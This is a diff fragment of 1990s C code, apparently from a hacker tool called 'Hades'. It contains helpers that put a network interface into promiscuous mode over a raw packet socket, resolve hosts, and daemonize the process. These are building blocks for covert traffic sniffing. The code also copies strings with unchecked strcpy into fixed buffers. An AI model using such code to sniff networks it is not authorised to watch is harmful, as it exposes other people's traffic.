+/*
+ *	Creates a low level raw-packet socket and puts the device into promiscuous mode.
+ */
+
+int tap(device)
+char *device;
+{
+	
+	int fd;				/* File descriptor */
+   	struct ifreq ifr;		/* Link-layer interface request structure */
+					/* Ethernet code for IP 0x800==ETH_P_IP */
+   	if((fd=socket(AF_INET,SOCK_PACKET,htons(ETH_P_IP)))<0){	/* Linux's way of */ 
+      		perror("SOCK_PACKET allocation problems");	/* getting link-layer */
+      		exit(1);					/* packets */
+   	}
+	strcpy(ifr.ifr_name,device);				
+   	if((ioctl(fd,SIOCGIFFLAGS,&ifr))<0){			/* Get the device info */
+      		perror("Can't get device flags");
+      		close(fd);
+      		exit(1);
+   	}
+   	ifr.ifr_flags|=IFF_PROMISC;				/* Set promiscuous mode */
+   	if((ioctl(fd,SIOCSIFFLAGS,&ifr))<0){			/* Set flags */
+		perror("Can't set promiscuous mode");
+   		close(fd);
+		exit(1);
+	}
+	return(fd);
+}
+
+/*
+ *	Network byte order into IP address
+ */
+
+char *hostLookup(in)
+unsigned long in;
+{
+ 
+   	char hostname[BUFSIZE];
+   	struct in_addr addr;
+   	struct hostent *hostEnt;
+   
+	bzero(&hostname,sizeof(hostname));
+	addr.s_addr=in;
+   	hostEnt=gethostbyaddr((char *)&addr, sizeof(struct in_addr),AF_INET);
+   	if(!hostEnt)strcpy(hostname,inet_ntoa(addr));
+   	else strcpy(hostname,hostEnt->h_name);
+   	return(strdup(hostname));
+}
+ 
+/*
+ *      Simple daemonizing procedure.
+ */   
+
+void shadow(void){
+
+        int fd,fs;
+        extern int errno;
+     	char werd[]={"\n\n\n\nHades is a Guild Corporation Production.  c.1996\n\n"}; 
+
+        signal(SIGTTOU,SIG_IGN);        /* Ignore these signals */
+        signal(SIGTTIN,SIG_IGN);
+        signal(SIGTSTP,SIG_IGN);
+	printf(werd);
+
+        switch(fork()){
+               case 0:                 /* Child */
+                        break;
+                default:        
+                        exit(0);        /* Parent */
+                case -1:
+                        fprintf(stderr,"Forking Error\n");
+                        exit(1);
+        }
+        setpgrp();
+        if((fd=open("/dev/tty",O_RDWR))>=0){
+                ioctl(fd,TIOCNOTTY,(char *)NULL);
+                close(fd);
+        }
+        /*for(fd=0;fd<NOFILE;fd++)close(fd);*/
+        errno=0;
+        chdir("/");
+        umask(0);
+}
+
+/*
+ *      Keeps processes from zombiing on us...
+ */
+        
+static void reaper(signo)
+int signo;
+{
+        pid_t pid;
+        int sys;
+
+        pid=wait(&sys); 
+        signal(SIGCHLD,reaper);
+        return;
+}
+
+
+-------------------------------8<-------cut-me-loose--------------------------
+
+EOF
+
